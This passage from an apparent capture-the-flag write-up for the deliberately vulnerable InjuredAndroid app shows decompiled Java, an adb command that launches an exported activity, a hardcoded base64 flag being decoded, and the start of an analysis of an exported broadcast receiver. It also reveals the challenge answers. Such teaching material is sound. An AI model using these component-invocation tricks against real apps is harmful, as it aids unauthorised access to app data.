    @Override &lt;span style=&#34;color:#6272a4&#34;&gt;// androidx.appcompat.app.ActivityC0453c, androidx.fragment.app.ActivityC0797d, androidx.activity.ComponentActivity, androidx.core.app.ActivityC0714e, android.app.Activity
&lt;/span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8be9fd&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;onCreate&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;Bundle bundle&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;super&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;onCreate&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;bundle&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        setContentView&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;layout&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;activity_b25l&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        ApplicationC1492j&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;f4506j&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m4062a&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; FlagsOverview&lt;span style=&#34;color:#ff79c6&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m4082M&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; ApplicationC1492j&lt;span style=&#34;color:#ff79c6&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m4065b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;flagTwoButtonColor&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Invoke the activity b25lActivity using adb&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;vx@archie:~$ adb shell am start  -n b3nac.injuredandroid/.b25lActivity
Starting: Intent &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;cmp&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;b3nac.injuredandroid/.b25lActivity &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We successfully start Flag two activity and we are rewarded with a flag.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://raw.githubusercontent.com/thuri10/images-blog/development/android/flag2.png&#34; &gt;
		&lt;img src=&#34;https://raw.githubusercontent.com/thuri10/images-blog/development/android/flag2.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;Flag two&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Flag two&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;flag-three---resources&#34;&gt;FLAG THREE - RESOURCES&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Goal: Understanding how an application references Resources.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;what are resources?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Resources are used for anything from defining colors, images, layouts, menus and string values. Everything defined here is referenced in the application`s code.&lt;/p&gt;
&lt;p&gt;The decompiled code for FlagThreeActivity is as shown below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#8be9fd&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;submitFlag&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
        EditText editText &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;EditText&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; findViewById&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;editText2&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        C2724g&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m882d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;editText&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;editText2&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;C2724g&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m885a&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;editText&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;getText&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(),&lt;/span&gt; getString&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;string&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;cmVzb3VyY2VzX3lv&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;)))&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
            Intent intent &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; Intent&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; FlagOneSuccess&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; FlagsOverview&lt;span style=&#34;color:#ff79c6&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m4083L&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; ApplicationC1492j&lt;span style=&#34;color:#ff79c6&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m4065b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;flagThreeButtonColor&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
            startActivity&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;intent&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Looking at the above  &lt;strong&gt;submitFlag&lt;/strong&gt; function defined in &lt;em&gt;&lt;strong&gt;FlagThreeActivity.java&lt;/strong&gt;&lt;/em&gt;, we arecomparing the user input with the value referenced at Resource  &lt;em&gt;&lt;strong&gt;cmVzb3VyY2VzX3lv&lt;/strong&gt;&lt;/em&gt; . R stands for resource.&lt;/p&gt;
&lt;p&gt;Looking at the strings we get our flags as referenced by the string above.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&amp;lt;string &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;cmVzb3VyY2VzX3lv&amp;#34;&lt;/span&gt;&amp;gt;F1ag_thr33&amp;lt;/string&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The  flag is  &lt;strong&gt;F1ag_thr33&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;flag-four---login2&#34;&gt;FLAG FOUR - LOGIN2&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Goal: Get the right flag&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;For flag four we analyze &lt;strong&gt;FlagFourActivity.java.&lt;/strong&gt;. First we need figure out the logic implemented in the submitflag class in the code below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#8be9fd&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;submitFlag&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
        EditText editText &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;EditText&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; findViewById&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;editText2&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        C2724g&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m882d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;editText&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;editText2&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        String obj &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; editText&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;getText&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
        &lt;span style=&#34;color:#8be9fd&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;[]&lt;/span&gt; a &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; C1489g&lt;span style=&#34;color:#ff79c6&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m4070a&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
        C2724g&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m882d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;a&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;decoder.getData()&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;C2724g&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m885a&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;obj&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; String&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;a&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; C2759c&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;f6854a&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;)))&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
            Intent intent &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; Intent&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; FlagOneSuccess&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; FlagsOverview&lt;span style=&#34;color:#ff79c6&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m4086I&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; ApplicationC1492j&lt;span style=&#34;color:#ff79c6&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m4065b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;flagFourButtonColor&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
            startActivity&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;intent&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the above,we are are getting user input and comparing with bytes in variable a. To understand the logic we analyze the class &lt;em&gt;&lt;strong&gt;c1489g&lt;/strong&gt;&lt;/em&gt; and member class &lt;em&gt;&lt;strong&gt;m4070a&lt;/strong&gt;&lt;/em&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;C1489g&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;

    &lt;span style=&#34;color:#6272a4&#34;&gt;/* renamed from: a */&lt;/span&gt;
    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#8be9fd&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;[]&lt;/span&gt; f4499a &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; Base64&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;decode&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;NF9vdmVyZG9uZV9vbWVsZXRz&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;

    &lt;span style=&#34;color:#6272a4&#34;&gt;/* renamed from: a */&lt;/span&gt;
    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8be9fd&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;m4070a&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;f4499a&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Looking at the public class &lt;strong&gt;c1489g&lt;/strong&gt;, it implements base64 decoding of the byte string and returned to the &lt;strong&gt;submitFlag&lt;/strong&gt; class .&lt;/p&gt;
&lt;p&gt;To get the string we are returning we need to decode the encoded string using base64 utility installed in linux .&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;NF9vdmVyZG9uZV9vbWVsZXRz&amp;#34;&lt;/span&gt; | base64 -d
4_overdone_omelets
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Our flag is :  &lt;strong&gt;4_overdone_omelets&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;flag-five---exported-broadcast-receivers&#34;&gt;FLAG FIVE - EXPORTED BROADCAST RECEIVERS&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Goal:&lt;/strong&gt; &lt;strong&gt;Understand how Broadcast receivers work&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Applications receive broadcasts in two ways:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Through manifest-declared receivers.&lt;/li&gt;
&lt;li&gt;Context-registered receivers.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Manifest-declared receivers - This type causes the system to launch application when broadcast is received. Searching in AndroidManifest.xml file we get where our broadcast is declared.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;receiver&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;android:name=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;b3nac.injuredandroid.FlagFiveReceiver&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;android:exported=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;activity&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;android:theme=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;@style/AppTheme.NoActionBar&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;android:label=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;@string/title_activity_flag_five&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;android:name=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;b3nac.injuredandroid.FlagFiveActivity&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In order to understand the Broadcast receivers, we need to analyze the &lt;strong&gt;oncreate()&lt;/strong&gt; method in the &lt;strong&gt;FlagFiveActivity.java&lt;/strong&gt; file.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8be9fd&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;onCreate&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;Bundle bundle&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;super&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;onCreate&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;bundle&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        setContentView&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;layout&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;activity_flag_five&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        m8078C&lt;span style=&#34;color:#ff79c6&#34;&gt;((&lt;/span&gt;Toolbar&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; findViewById&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;toolbar&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;));&lt;/span&gt;
